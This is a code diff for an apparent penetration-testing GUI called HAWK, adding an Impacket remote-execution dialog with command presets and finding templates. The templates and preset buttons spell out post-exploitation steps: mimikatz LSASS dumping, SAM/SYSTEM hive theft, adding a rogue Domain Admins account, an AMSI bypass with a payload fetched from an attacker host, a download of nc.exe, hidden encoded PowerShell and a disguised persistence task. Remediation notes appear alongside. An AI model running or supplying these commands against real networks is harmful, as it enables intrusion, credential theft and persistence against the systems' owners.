@@ -46,6 +46,349 @@ from utils.runner import ToolRunner, MultiRunner, MetasploitRunner, GreenBoneRun
 from utils.session import Credential
 from gui.widgets.card_common import *
 
+
+# Methods offered by the consolidated IMPACKET EXEC card's METHOD
+# dropdown.  Module-level so tests can import + verify the set
+# without constructing the dialog.
+IMPACKET_EXEC_METHODS = ("psexec", "smbexec", "wmiexec",
+                          "atexec", "dcomexec")
+
+
+def impacket_bin_for(method: str) -> str:
+    """Map a method name to the impacket binary that implements it.
+
+    Single source of truth shared by the live command preview, the
+    RUN command builder, and the unit tests.  Adding a new impacket
+    verb only requires appending it to IMPACKET_EXEC_METHODS above;
+    the binary name is derived automatically (with two hard-coded
+    special cases: evil-winrm's dash and goldenPac's capital P).
+    """
+    if method == "evil_winrm":
+        return "evil-winrm"
+    if method == "goldenpac":
+        return "impacket-goldenPac"
+    return f"impacket-{method}"
+
+
+def impacket_exec_captureable(method: str, wmiexec_cmd: str = "") -> bool:
+    """Whether HAWK can observe the exec method's outcome from stdout.
+
+    Returns True when the method runs as a single command that
+    exits with capturable output (routed through ToolRunner, parsed
+    from _on_done), False when it drops the operator into an
+    interactive xterm shell HAWK cannot see (LAUNCH ≠ RCE).
+
+    - atexec   : always captureable (single-shot; a Command is
+                 required and impacket-atexec exits after the task
+                 lifecycle).
+    - wmiexec  : captureable only when a Command was supplied (one-
+                 shot or fire-and-forget); the bare interactive
+                 shell is not captureable.
+    - everything else (psexec / smbexec / dcomexec / evil_winrm /
+      bare wmiexec) : xterm-only, not captureable.
+
+    Isolated at module scope so tests and the routing code share
+    ONE source of truth.
+    """
+    if method == "atexec":
+        return True
+    if method == "wmiexec":
+        return bool((wmiexec_cmd or "").strip())
+    return False
+
+
+# Short honest descriptions written to Target Intel when a method is
+# xterm-launched (HAWK cannot observe the outcome).  LOW severity —
+# claims a launch, not RCE.  Different title from the confirmed-RCE
+# finding so the two never merge over each other.  Placeholder {t}
+# = target IP.
+IMPACKET_EXEC_LAUNCHED_DESC = {
+    "psexec": (
+        "impacket-psexec was launched in a new xterm against {t}.  "
+        "HAWK does not capture interactive shell I/O — verify the "
+        "shell in the xterm window.  If a working SYSTEM shell "
+        "landed, promote this finding manually or re-run through "
+        "a captureable method (atexec with a command, wmiexec with "
+        "a command) so HAWK can parse the outcome and push a real "
+        "RCE finding."),
+    "smbexec": (
+        "impacket-smbexec was launched in a new xterm against {t}.  "
+        "HAWK does not capture interactive shell I/O — verify the "
+        "shell in the xterm window.  If a working SYSTEM shell "
+        "landed, promote this finding manually."),
+    "wmiexec": (
+        "impacket-wmiexec was launched in a new xterm against {t} "
+        "in interactive-shell mode (no Command field set).  HAWK "
+        "does not capture interactive shell I/O — verify the shell "
+        "in the xterm window.  Prefer wmiexec with a Command "
+        "(one-shot or -nooutput fire-and-forget) so HAWK sees the "
+        "outcome and pushes a real RCE finding."),
+    "dcomexec": (
+        "impacket-dcomexec was launched in a new xterm against {t}.  "
+        "HAWK does not capture interactive shell I/O — verify the "
+        "shell in the xterm window.  On legacy Windows (Server "
+        "2008 R2 / 2003 / XP) the DCOM COM objects (MMC20 / "
+        "ShellWindows / ShellBrowserWindow) are not registered and "
+        "the call hangs or returns REGDB_E_CLASSNOTREG — a launched "
+        "finding on a legacy target is often a hang, NOT an RCE."),
+    "evil_winrm": (
+        "evil-winrm was launched in a new xterm against {t}.  HAWK "
+        "does not capture interactive shell I/O — verify the shell "
+        "in the xterm window."),
+}
+
+
+# Chain-hint one-liners — one "→ Next: …" line per method written
+# to the HAWK terminal after a run so the operator sees the next
+# logical move without having to open the Target Intel panel.  Same
+# text whether the run was captureable (parser-driven) or xterm-
+# launched — the advice does not depend on outcome, just on the
+# method's typical follow-up.  Keys are METHOD names (as returned
+# by _active_method()).
+IMPACKET_EXEC_CHAIN_HINT = {
+    "evil_winrm":
+        "→ Next: 'whoami /priv' inside the shell to spot "
+        "SeDebugPrivilege; then upload+run mimikatz for LSASS, or "
+        "Invoke-Command to pivot to sibling WinRM hosts with the "
+        "same creds (no re-auth).",
+    "wmiexec":
+        "→ Next: reg save HKLM\\SAM + HKLM\\SYSTEM to "
+        "C:\\Windows\\Temp, then pull with impacket-smbclient and "
+        "secretsdump LOCAL offline — yields the local admin NTLM "
+        "for PtH on sibling hosts.  Or jump straight to "
+        "SECRETSDUMP DCSync if this is a DC.",
+    "psexec":
+        "→ Next: you landed as SYSTEM — reg save "
+        "SAM/SYSTEM/SECURITY hives, then run SECRETSDUMP DCSync "
+        "(if DC) for the whole NTDS.  Plant persistence BEFORE "
+        "closing the xterm (the RemComSvc service goes away when "
+        "you exit).",
+    "smbexec":
+        "→ Next: SYSTEM shell without a disk drop — reg save "
+        "SAM/SYSTEM/SECURITY hives and pull with impacket-"
+        "smbclient, then run SECRETSDUMP DCSync (if DC).  Seed a "
+        "scheduled task BEFORE closing xterm; the smbexec service "
+        "is deleted on exit.",
+    "atexec":
+        "→ Next: re-run IMPACKET EXEC (atexec) with -silentcommand "
+        "checked and the 'add DA' preset for persistence, or the "
+        "'dump SAM' preset then pull the hive via "
+        "impacket-smbclient.  Also try SECRETSDUMP DCSync with "
+        "same creds if this is a DC.",
+    "dcomexec":
+        "→ Next: DCOM shell runs as your user (NOT SYSTEM) — "
+        "'whoami /priv' to inspect the token, then IEX a "
+        "PowerShell payload in-memory to keep the audit trail "
+        "split between mmc.exe (spawn parent) and the payload's "
+        "process.",
+}
+
+
+# Rich HIGH-severity finding templates used when the parser
+# (_parse_impacket_exec_to_intel in card_parsers_ad.py) confirms
+# that the exec method actually succeeded — i.e. the ToolRunner
+# output contains the expected success signals.  The xterm-only
+# path uses IMPACKET_EXEC_LAUNCHED_DESC (LOW severity) instead
+# because HAWK cannot observe the xterm shell.
+#
+# Each entry: (source, title_template, description_template).
+# Placeholders in descriptions: {t} target, {a} auth, {dom} domain,
+# {cmd} the atexec command (empty for other methods — safe to
+# reference; always present in the fmt dict).  Literal curly braces
+# MUST be doubled ({{ }}) so str.format(**fmt) doesn't try to
+# substitute them.
+_IMPACKET_EXEC_SEP = "\n── {} " + "─" * 44 + "\n"
+
+IMPACKET_EXEC_CONFIRMED_FINDING = {
+    "evil_winrm": (
+        "EVIL-WINRM",
+        "WinRM shell on {t}",
+        "Remote PowerShell shell opened via WinRM (evil-winrm)."
+        + _IMPACKET_EXEC_SEP.format("RESULT") +
+        "  Target    : {t}:5985 (HTTP WinRM)\n"
+        "  Auth      : {a}\n"
+        "  Domain    : {dom}\n"
+        "  Context   : the authenticated user (NOT SYSTEM) — "
+        "confirm with 'whoami /priv' inside the xterm.\n"
+        "  Output    : xterm only — HAWK does not capture "
+        "interactive I/O."
+        + _IMPACKET_EXEC_SEP.format("PROOF") +
+        "  Full interactive PowerShell on the target, "
+        "equivalent to RDP without the GUI.  evil-winrm ships "
+        "built-ins for upload/download, loads PS1 scripts and "
+        ".NET assemblies in-memory, and supports pass-the-hash.  "
+        "A local-admin account puts LSASS/SAM/DPAPI one step "
+        "away."
+        + _IMPACKET_EXEC_SEP.format(
+            "NEXT STEPS  (run inside the xterm)") +
+        "\n  [1] Enumerate token privileges\n"
+        "      $ whoami /priv ; whoami /groups\n"
+        "      Why: confirm SeDebugPrivilege / "
+        "SeImpersonatePrivilege before staging LSASS\n"
+        "           or token-impersonation attacks.\n\n"
+        "  [2] Dump LSASS with mimikatz\n"
+        "      $ upload <KALI_PATH>/mimikatz.exe "
+        "C:\\Windows\\Temp\\m.exe\n"
+        "      $ C:\\Windows\\Temp\\m.exe "
+        "'privilege::debug' 'sekurlsa::logonpasswords' exit\n"
+        "      Why: with debug privilege this yields cleartext "
+        "creds from LSASS.\n\n"
+        "  [3] Pivot to sibling WinRM hosts\n"
+        "      $ Invoke-Command -ComputerName <OTHER_HOST> "
+        "-ScriptBlock {{ hostname }}\n"
+        "      Why: WinRM chains — same creds reach every "
+        "WinRM-enabled host, no re-auth.\n\n"
+        "  [4] AMSI-bypass + in-memory payload\n"
+        "      evil-winrm> menu  →  Bypass-4MSI\n"
+        "      PS> IEX(New-Object Net.WebClient)."
+        "DownloadString('http://<KALI>/pwn.ps1')\n"
+        "      Why: the AMSI menu clears the runspace so "
+        "subsequent PowerShell payloads load without Defender "
+        "flagging strings."
+        + _IMPACKET_EXEC_SEP.format("REMEDIATION") +
+        "  • Disable WinRM where not needed:\n"
+        "      Disable-PSRemoting -Force\n"
+        "      Stop-Service WinRM\n"
+        "      Set-Service WinRM -StartupType Disabled\n"
+        "  • Restrict WinRM to management VLANs (Windows "
+        "Firewall inbound rule 'Windows Remote Management "
+        "(HTTP-In)').\n"
+        "  • Group Policy > WinRM Service > Allow unencrypted "
+        "= Disabled ; Allow Basic auth = Disabled.\n"
+        "  • Monitor Event ID 91/168 and 4624 logon-type 3 "
+        "with process wsmprovhost.exe."
+    ),
+    "wmiexec": (
+        "WMIEXEC",
+        "WMI RCE confirmed on {t}",
+        "Remote command execution via WMI Win32_Process.Create "
+        "(impacket-wmiexec) — success confirmed from captured "
+        "stdout."
+        + _IMPACKET_EXEC_SEP.format("RESULT") +
+        "  Target    : {t}:135 (RPC) + dynamic high ports\n"
+        "  I/O read  : ADMIN$ share (SMB 445)\n"
+        "  Auth      : {a}\n"
+        "  Domain    : {dom}\n"
+        "  Command   : {cmd}\n"
+        "  Context   : the authenticated user (NOT SYSTEM) — "
+        "spawned by wmiprvse.exe as that account."
+        + _IMPACKET_EXEC_SEP.format("PROOF") +
+        "  RCE without installing a service — WMI Win32_Process."
+        "Create spawned the command on the target and HAWK "
+        "captured its stdout / WMI return.  Smaller footprint "
+        "than psexec (no Event 7045, no binary on disk)."
+        + _IMPACKET_EXEC_SEP.format("NEXT STEPS") +
+        "\n  [1] Confirm privileges\n"
+        "      $ whoami /priv\n"
+        "      Why: WMI shells don't run as SYSTEM — check the "
+        "token before staging LSASS.\n\n"
+        "  [2] Dump SAM + SYSTEM hives\n"
+        "      $ reg save HKLM\\SAM C:\\Windows\\Temp\\sam.hiv\n"
+        "      $ reg save HKLM\\SYSTEM "
+        "C:\\Windows\\Temp\\sys.hiv\n"
+        "      Then pull with impacket-smbclient and run "
+        "secretsdump LOCAL offline → local admin NTLM for PtH "
+        "on sibling hosts.\n\n"
+        "  [3] Fileless PowerShell payload\n"
+        "      $ powershell -nop -w hidden -enc "
+        "<BASE64_PAYLOAD>\n"
+        "      Why: encoded PowerShell hides the command line "
+        "from string-matching AV rules.\n\n"
+        "  [4] Add domain-admin persistence\n"
+        "      $ net user <NEW_USER> <NEW_PASS> /add /domain\n"
+        "      $ net group 'Domain Admins' <NEW_USER> /add "
+        "/domain\n"
+        "      Why: a fresh DA account survives password "
+        "rotations on the compromised admin."
+        + _IMPACKET_EXEC_SEP.format("REMEDIATION") +
+        "  • Block remote WMI at the perimeter:\n"
+        "      netsh advfirewall firewall set rule group=\n"
+        "        \"Windows Management Instrumentation (WMI)\" "
+        "new enable=No\n"
+        "  • Restrict DCOM/RPC 135 + dynamic ports to "
+        "management hosts.\n"
+        "  • Monitor Sysmon Event ID 1 with "
+        "ParentImage=WmiPrvSE.exe and Event ID 5857 (WMI "
+        "provider load).\n"
+        "  • Enforce SMB signing so ADMIN$ output read cannot "
+        "be relayed."
+    ),
+    "atexec": (
+        "ATEXEC",
+        "Task Scheduler RCE confirmed on {t}",
+        "Single-shot remote command execution via Windows Task "
+        "Scheduler (ITaskSchedulerService, impacket-atexec) — "
+        "success confirmed from captured task lifecycle."
+        + _IMPACKET_EXEC_SEP.format("RESULT") +
+        "  Target    : {t}:445 (SMB) + RPC 135\n"
+        "  Auth      : {a}\n"
+        "  Domain    : {dom}\n"
+        "  Command   : {cmd}\n"
+        "  Context   : NT AUTHORITY\\SYSTEM  (task runs as "
+        "LocalSystem)\n"
+        "  Output    : captured in HAWK terminal (ToolRunner)."
+        + _IMPACKET_EXEC_SEP.format("PROOF") +
+        "  SYSTEM-level RCE via a code path distinct from "
+        "psexec/wmiexec — HAWK saw the full "
+        "Creating/Running/Deleting task lifecycle and the "
+        "command's output.  Single-shot: every command re-runs "
+        "the full create/exec/read/delete cycle.  Requires "
+        "local admin for remote task creation."
+        + _IMPACKET_EXEC_SEP.format(
+            "NEXT STEPS  (re-run ATEXEC, "
+            "placeholders in <ANGLE>)") +
+        "\n  [1] Add domain-admin persistence\n"
+        "      $ net user <NEW_USER> <NEW_PASS> /add /domain\n"
+        "      $ net group \"Domain Admins\" <NEW_USER> /add "
+        "/domain\n"
+        "      Why: DA account survives password rotations.  "
+        "Pair with -silentcommand.\n\n"
+        "  [2] Dump SAM + SYSTEM hives\n"
+        "      $ reg save HKLM\\SAM C:\\Windows\\Temp\\sam.hiv\n"
+        "      $ reg save HKLM\\SYSTEM "
+        "C:\\Windows\\Temp\\sys.hiv\n"
+        "      Then pull with impacket-smbclient and run "
+        "secretsdump LOCAL offline → local admin NTLM for PtH."
+        "\n\n"
+        "  [3] Fileless persistence task\n"
+        "      $ powershell -w hidden -nop -c \n"
+        "        \"schtasks /create /sc onstart /tn Updater\n"
+        "         /tr 'C:\\Windows\\Temp\\pwn.exe' /ru SYSTEM\"\n"
+        "      Why: benign task name, survives reboots, "
+        "outlives the atexec ephemeral task.\n\n"
+        "  [4] Stage attacker toolkit\n"
+        "      $ curl http://<KALI>:<PORT>/nc.exe -o "
+        "C:\\Windows\\Temp\\nc.exe\n"
+        "      Why: SYSTEM+atexec is a clean downloader.  Pair "
+        "with -silentcommand and an HTTP listener on Kali."
+        + _IMPACKET_EXEC_SEP.format("HAWK TIP") +
+        "  Check the dialog's -silentcommand box to skip the "
+        "ADMIN$ output read entirely (fire-and-forget).  "
+        "Recommended for persistence commands where the return "
+        "value doesn't matter, and it dodges "
+        "STATUS_OBJECT_NAME_NOT_FOUND on legacy Windows."
+        + _IMPACKET_EXEC_SEP.format("REMEDIATION") +
+        "  • Restrict remote task creation:\n"
+        "      GPO > Computer Config > Admin Templates > "
+        "System > Task Scheduler\n"
+        "  • Audit Event ID 4698 (created) + 4699 (deleted) — "
+        "atexec creates+deletes within seconds, unmistakable "
+        "pattern.\n"
+        "  • Block SMB (445) + RPC (135) from untrusted VLANs.\n"
+        "  • Alert on 8-char random task names under \\ root + "
+        "ADMIN$\\Temp writes matching 8 word-chars + .tmp."
+    ),
+    # psexec / smbexec / dcomexec are xterm-only in the current
+    # design — they never reach this parser-driven dict.  They
+    # push a LOW-severity "launched" finding via
+    # IMPACKET_EXEC_LAUNCHED_DESC instead; the operator promotes
+    # a confirmed shell manually.  Entries kept here as
+    # placeholders for a future capture-friendly rewrite (e.g.
+    # tee'ing the xterm command through a temp file HAWK can
+    # tail).
+}
+
+
 class CardADRoutesMixin:
     def _usable_creds_for_impacket(self, target: str) -> list:
         """Enumerate every credential in the store (regular + AD
@@ -335,12 +678,22 @@ class CardADRoutesMixin:
         from gui.dialogs import (_make_win, _title, _sub, _note_box,
                                  _btn_row, _btn, _safe_destroy)
 
-        win = _make_win(self, f"Impacket — {tool.name}", 560, 380)
+        win = _make_win(self, f"Impacket — {tool.name}", 640, 560)
         _title(win, f"{tool.name} — Authentication")
         _sub(win, f"Target: {target}", COLORS["text_dim"])
 
+        # Scrollable body so tall dialogs (atexec: presets + silent +
+        # target-aware hints + preview) never clip below the button
+        # row.  Everything variable-height packs into `body`; only
+        # title / sub / button row stay on `win`.
+        body = ctk.CTkScrollableFrame(
+            win, fg_color="transparent",
+            scrollbar_button_color=COLORS["border_dim"],
+            scrollbar_button_hover_color=COLORS["border_green"])
+        body.pack(fill="both", expand=True, padx=0, pady=(0, 4))
+
         def _row(label, var, show="", hint=""):
-            f = ctk.CTkFrame(win, fg_color="transparent")
+            f = ctk.CTkFrame(body, fg_color="transparent")
             f.pack(fill="x", padx=24, pady=(4, 0))
             ctk.CTkLabel(f, text=label, width=110, anchor="w",
                          font=_f("sm", True),
@@ -354,7 +707,7 @@ class CardADRoutesMixin:
             e.pack(side="left", fill="x", expand=True)
             add_context_menu(e)
             if hint:
-                ctk.CTkLabel(win, text=hint, font=_f("xs"),
+                ctk.CTkLabel(body, text=hint, font=_f("xs"),
                              text_color=COLORS["text_dim"],
                              anchor="w").pack(fill="x", padx=24)
             return e
@@ -363,15 +716,278 @@ class CardADRoutesMixin:
         pass_var   = ctk.StringVar(value=dp)
         hash_var   = ctk.StringVar(value=dh)
         domain_var = ctk.StringVar(value=dd)
+        # atexec is single-shot; default 'whoami' verifies auth+RCE.
+        atexec_cmd_var  = ctk.StringVar(value="whoami")
+        # atexec -silentcommand — skip ADMIN$ output read (fire-and-
+        # forget; also dodges the 2008 R2 timing race).
+        silent_var      = ctk.BooleanVar(value=False)
+        # wmiexec optional trailing command — when set, wmiexec runs
+        # it once and exits (no shell).  Required when -nooutput is
+        # checked (impacket rejects -nooutput with interactive shell).
+        wmiexec_cmd_var = ctk.StringVar(value="")
+        # wmiexec -nooutput — fire-and-forget; skip ADMIN$ output
+        # read.  Only meaningful when wmiexec_cmd_var is filled.
+        nooutput_var    = ctk.BooleanVar(value=False)
+        # dcomexec -object — which COM object impacket instantiates.
+        dcom_object_var = ctk.StringVar(value="MMC20")
+        # Method dropdown state — only meaningful when tool.id is
+        # "impacket_exec" (the consolidated card).  The dropdown value
+        # picks the impacket-<method> binary at run time.
+        method_var = ctk.StringVar(value="psexec")
+
+        def _active_method():
+            """Which impacket method the operator is about to run.
+
+            - impacket_exec  → METHOD dropdown value
+            - evil_winrm     → literal "evil_winrm"
+            - other helpers  → tool.id with the "impacket_" prefix
+              stripped (secretsdump / smbclient / mssqlclient /
+              lookupsid / samrdump / rpcdump / goldenpac)
+            """
+            if tool.id == "impacket_exec":
+                return method_var.get()
+            if tool.id == "evil_winrm":
+                return "evil_winrm"
+            return tool.id.replace("impacket_", "", 1)
+
+        # Shared with tests via the module-level helper — one source
+        # of truth for the method → binary mapping.
+        _bin_for = impacket_bin_for
 
         _row("Username",  user_var,   "",  "default 'Administrator'")
         _row("Password",  pass_var,   "",  "leave blank if using NTLM hash")
         _row("NTLM hash", hash_var,   "",  "optional — pass-the-hash, overrides password")
         _row("Domain",    domain_var, "",  "optional — pre-filled from session target_domain")
 
+        # ── METHOD dropdown (impacket_exec only) ─────────────────────
+        if tool.id == "impacket_exec":
+            m_row = ctk.CTkFrame(body, fg_color="transparent")
+            m_row.pack(fill="x", padx=24, pady=(8, 0))
+            ctk.CTkLabel(m_row, text="Method", width=110, anchor="w",
+                         font=_f("sm", True),
+                         text_color=COLORS["text_bright"]).pack(side="left")
+            ctk.CTkOptionMenu(
+                m_row, variable=method_var,
+                values=list(IMPACKET_EXEC_METHODS),
+                width=180, height=30, font=_f("sm"),
+                fg_color=COLORS["bg_card"],
+                button_color=COLORS["border_green"],
+                button_hover_color=COLORS["border_dim"],
+                text_color=COLORS["text_bright"],
+                dropdown_fg_color=COLORS["bg_card"],
+                dropdown_hover_color=COLORS["border_green"],
+                dropdown_text_color=COLORS["text_bright"],
+            ).pack(side="left")
+            ctk.CTkLabel(body,
+                         text=("psexec / smbexec → SYSTEM · wmiexec / "
+                               "dcomexec → your user · atexec → SYSTEM "
+                               "(needs a command)"),
+                         font=_f("xs"),
+                         text_color=COLORS["text_dim"],
+                         anchor="w").pack(fill="x", padx=24)
+
+        # ── Method-specific extras (impacket_exec only) ──────────────
+        # All three sub-frames are built up-front; a method-change
+        # trace pack_forget's the previous one and packs the new one.
+        # Non-impacket_exec routes (evil_winrm, secretsdump, etc.)
+        # never see these frames.
+        atexec_frame  = None
+        wmiexec_frame = None
+        dcomexec_frame = None
+        if tool.id == "impacket_exec":
+            extras_holder = ctk.CTkFrame(body, fg_color="transparent")
+            extras_holder.pack(fill="x")
+
+            # atexec extras: Command + presets + -silentcommand
+            atexec_frame = ctk.CTkFrame(extras_holder,
+                                         fg_color="transparent")
+            _cmd_row = ctk.CTkFrame(atexec_frame, fg_color="transparent")
+            _cmd_row.pack(fill="x", padx=24, pady=(4, 0))
+            ctk.CTkLabel(_cmd_row, text="Command", width=110,
+                         anchor="w", font=_f("sm", True),
+                         text_color=COLORS["text_bright"]).pack(side="left")
+            _cmd_e = ctk.CTkEntry(_cmd_row, textvariable=atexec_cmd_var,
+                                   font=_f("sm"), height=30,
+                                   fg_color=COLORS["bg_card"],
+                                   text_color=COLORS["text_bright"],
+                                   border_color=COLORS["border_green"],
+                                   border_width=1, corner_radius=3)
+            _cmd_e.pack(side="left", fill="x", expand=True)
+            add_context_menu(_cmd_e)
+            ctk.CTkLabel(atexec_frame,
+                         text="command to execute on the target "
+                              "(default: whoami)",
+                         font=_f("xs"),
+                         text_color=COLORS["text_dim"],
+                         anchor="w").pack(fill="x", padx=24)
+
+            _ATEXEC_PRESETS = [
+                ("whoami",     "whoami"),
+                ("hostname",   "hostname"),
+                ("dump SAM",   "reg save HKLM\\SAM "
+                               "C:\\Windows\\Temp\\sam.hiv"),
+                ("dump SYSTEM","reg save HKLM\\SYSTEM "
+                               "C:\\Windows\\Temp\\sys.hiv"),
+                ("add DA",     "net user <NEW_USER> <NEW_PASS> "
+                               "/add /domain"),
+                ("PS payload", 'powershell -w hidden -nop -enc '
+                               '<BASE64_PAYLOAD>'),
+                ("download",   "curl http://<KALI>:<PORT>/nc.exe -o "
+                               "C:\\Windows\\Temp\\nc.exe"),
+            ]
+            chip_row = ctk.CTkFrame(atexec_frame, fg_color="transparent")
+            chip_row.pack(fill="x", padx=24, pady=(2, 0))
+            ctk.CTkLabel(chip_row, text="Presets:", width=110,
+                         anchor="w", font=_f("xs"),
+                         text_color=COLORS["text_dim"]).pack(side="left")
+            chip_wrap = ctk.CTkFrame(chip_row, fg_color="transparent")
+            chip_wrap.pack(side="left", fill="x", expand=True)
+            for label, preset_cmd in _ATEXEC_PRESETS:
+                ctk.CTkButton(
+                    chip_wrap, text=label, width=1, height=22,
+                    font=_f("xs"),
+                    fg_color=COLORS["bg_card"],
+                    hover_color=COLORS["border_green"],
+                    text_color=COLORS["text_bright"],
+                    border_color=COLORS["border_dim"],
+                    border_width=1, corner_radius=3,
+                    command=lambda c=preset_cmd:
+                        atexec_cmd_var.set(c)
+                ).pack(side="left", padx=(0, 4), pady=1)
+
+            sc_row = ctk.CTkFrame(atexec_frame, fg_color="transparent")
+            sc_row.pack(fill="x", padx=24, pady=(4, 0))
+            ctk.CTkCheckBox(
+                sc_row,
+                text="  -silentcommand  (skip ADMIN$ output read — "
+                     "fire-and-forget; dodges the 2008 R2 race)",
+                variable=silent_var,
+                font=_f("xs"),
+                text_color=COLORS["text_dim"],
+                fg_color=COLORS["border_green"],
+                border_color=COLORS["border_dim"],
+                hover_color=COLORS["border_green"],
+                border_width=1, corner_radius=3,
+                checkbox_width=14, checkbox_height=14,
+            ).pack(anchor="w")
+
+            # wmiexec extras: optional Command + presets + -nooutput
+            # (interactive shell if Command is empty; one-shot if
+            # Command is filled; fire-and-forget if -nooutput is also
+            # checked — impacket-wmiexec forbids -nooutput with the
+            # interactive shell so we validate that in _run).
+            wmiexec_frame = ctk.CTkFrame(extras_holder,
+                                          fg_color="transparent")
+            _wcmd_row = ctk.CTkFrame(wmiexec_frame,
+                                      fg_color="transparent")
+            _wcmd_row.pack(fill="x", padx=24, pady=(4, 0))
+            ctk.CTkLabel(_wcmd_row, text="Command", width=110,
+                         anchor="w", font=_f("sm", True),
+                         text_color=COLORS["text_bright"]).pack(side="left")
+            _wcmd_e = ctk.CTkEntry(_wcmd_row,
+                                    textvariable=wmiexec_cmd_var,
+                                    font=_f("sm"), height=30,
+                                    fg_color=COLORS["bg_card"],
+                                    text_color=COLORS["text_bright"],
+                                    border_color=COLORS["border_green"],
+                                    border_width=1, corner_radius=3)
+            _wcmd_e.pack(side="left", fill="x", expand=True)
+            add_context_menu(_wcmd_e)
+            ctk.CTkLabel(wmiexec_frame,
+                         text="optional — leave blank for an "
+                              "interactive shell; fill for one-shot "
+                              "(pair with -nooutput for fire-and-forget)",
+                         font=_f("xs"),
+                         text_color=COLORS["text_dim"],
+                         anchor="w").pack(fill="x", padx=24)
+
+            _WMIEXEC_PRESETS = [
+                ("whoami",     "whoami"),
+                ("hostname",   "hostname"),
+                ("dump SAM",   "cmd /c reg save HKLM\\SAM "
+                               "C:\\Windows\\Temp\\sam.hiv"),
+                ("dump SYSTEM","cmd /c reg save HKLM\\SYSTEM "
+                               "C:\\Windows\\Temp\\sys.hiv"),
+                ("add DA",     "cmd /c net user <NEW_USER> "
+                               "<NEW_PASS> /add /domain"),
+                ("PS payload", 'powershell -w hidden -nop -enc '
+                               '<BASE64_PAYLOAD>'),
+                ("download",   "cmd /c curl "
+                               "http://<KALI>:<PORT>/nc.exe -o "
+                               "C:\\Windows\\Temp\\nc.exe"),
+            ]
+            wchip_row = ctk.CTkFrame(wmiexec_frame,
+                                      fg_color="transparent")
+            wchip_row.pack(fill="x", padx=24, pady=(2, 0))
+            ctk.CTkLabel(wchip_row, text="Presets:", width=110,
+                         anchor="w", font=_f("xs"),
+                         text_color=COLORS["text_dim"]).pack(side="left")
+            wchip_wrap = ctk.CTkFrame(wchip_row,
+                                       fg_color="transparent")
+            wchip_wrap.pack(side="left", fill="x", expand=True)
+            for label, preset_cmd in _WMIEXEC_PRESETS:
+                ctk.CTkButton(
+                    wchip_wrap, text=label, width=1, height=22,
+                    font=_f("xs"),
+                    fg_color=COLORS["bg_card"],
+                    hover_color=COLORS["border_green"],
+                    text_color=COLORS["text_bright"],
+                    border_color=COLORS["border_dim"],
+                    border_width=1, corner_radius=3,
+                    command=lambda c=preset_cmd:
+                        wmiexec_cmd_var.set(c)
+                ).pack(side="left", padx=(0, 4), pady=1)
+
+            no_row = ctk.CTkFrame(wmiexec_frame,
+                                   fg_color="transparent")
+            no_row.pack(fill="x", padx=24, pady=(4, 0))
+            ctk.CTkCheckBox(
+                no_row,
+                text="  -nooutput  (fire-and-forget; requires the "
+                     "Command field above — impacket forbids "
+                     "-nooutput with an interactive shell)",
+                variable=nooutput_var,
+                font=_f("xs"),
+                text_color=COLORS["text_dim"],
+                fg_color=COLORS["border_green"],
+                border_color=COLORS["border_dim"],
+                hover_color=COLORS["border_green"],
+                border_width=1, corner_radius=3,
+                checkbox_width=14, checkbox_height=14,
+            ).pack(anchor="w")
+
+            # dcomexec extras: -object dropdown
+            dcomexec_frame = ctk.CTkFrame(extras_holder,
+                                           fg_color="transparent")
+            do_row = ctk.CTkFrame(dcomexec_frame,
+                                   fg_color="transparent")
+            do_row.pack(fill="x", padx=24, pady=(4, 0))
+            ctk.CTkLabel(do_row, text="COM object", width=110,
+                         anchor="w", font=_f("sm", True),
+                         text_color=COLORS["text_bright"]).pack(side="left")
+            ctk.CTkOptionMenu(
+                do_row, variable=dcom_object_var,
+                values=["MMC20", "ShellWindows", "ShellBrowserWindow"],
+                width=200, height=30, font=_f("sm"),
+                fg_color=COLORS["bg_card"],
+                button_color=COLORS["border_green"],
+                button_hover_color=COLORS["border_dim"],
+                text_color=COLORS["text_bright"],
+                dropdown_fg_color=COLORS["bg_card"],
+                dropdown_hover_color=COLORS["border_green"],
+                dropdown_text_color=COLORS["text_bright"],
+            ).pack(side="left")
+            ctk.CTkLabel(dcomexec_frame,
+                         text=("MMC20 = mmc.exe parent (default) · "
+                               "ShellWindows / ShellBrowserWindow = "
+                               "explorer.exe parent"),
+                         font=_f("xs"),
+                         text_color=COLORS["text_dim"],
+                         anchor="w").pack(fill="x", padx=24)
+
         if empty_store_hint:
             _note_box(
-                win,
+                body,
                 "No suitable credentials in the Credential Store for "
                 "this target — type the username and password (or "
                 "NTLM hash) manually.  Anonymous / guest accounts "
@@ -380,48 +996,321 @@ class CardADRoutesMixin:
                 COLORS["border_amber"])
         else:
             _note_box(
-                win,
+                body,
                 "Fields are pre-filled from the Credential Store.  "
                 "Either a password OR an NTLM hash is required; the "
                 "tool picks the right impacket flag automatically.  "
                 "Edit freely — typed values override the pre-fill.",
                 COLORS["border_dim"])
 
-        # ── Per-tool admin requirement warning ────────────────────
-        if tool.id == "impacket_wmiexec":
-            _note_box(
-                win,
-                "⚠  WMIEXEC REQUIRES LOCAL ADMIN ON THE TARGET\n\n"
-                "WMI remote access (port 135 + dynamic RPC) and the "
-                "ADMIN$ share used to read command output are restricted "
-                "to local administrators by default.\n\n"
-                "If you authenticate as a normal domain user you will "
-                "get ACCESS_DENIED or complete silence — the tool exits "
-                "with no error message.\n\n"
-                "→ Use 'Administrator' or any local admin account.\n"
-                "→ Pass-the-hash (-hashes :NTHASH) works if you have "
-                "the admin NTLM hash from secretsdump.\n\n"
-                "Output appears in the xterm window.  HAWK does not "
-                "capture or parse interactive shell sessions — use the "
-                "shell to run your commands and copy results manually.",
-                COLORS["text_red"])
-        elif tool.id == "impacket_atexec":
-            _note_box(
-                win,
-                "⚠  ATEXEC REQUIRES LOCAL ADMIN ON THE TARGET\n\n"
-                "The Task Scheduler RPC interface (ITaskSchedulerService, "
-                "port 445 / SMB) only allows remote task creation for "
-                "local administrators.\n\n"
-                "If you authenticate as a normal domain user you will "
-                "get ACCESS_DENIED with no further output — the command "
-                "is never executed.\n\n"
-                "→ Use 'Administrator' or any local admin account.\n"
-                "→ Pass-the-hash (-hashes :NTHASH) works if you have "
-                "the admin NTLM hash from secretsdump.\n\n"
-                "Output appears in the xterm window.  HAWK does not "
-                "capture or parse atexec output — results are shown "
-                "only in the terminal window.",
-                COLORS["text_red"])
+        # ── Method-specific admin warning (dynamic) ──────────────────
+        # One warning box; the text swaps when the METHOD dropdown
+        # changes, so the operator always sees the caveat for the
+        # method they're about to run.
+        _METHOD_WARNINGS = {
+            "psexec": (
+                "⚠  PSEXEC REQUIRES LOCAL ADMIN\n\n"
+                "impacket-psexec uploads RemComSvc.exe to ADMIN$ and "
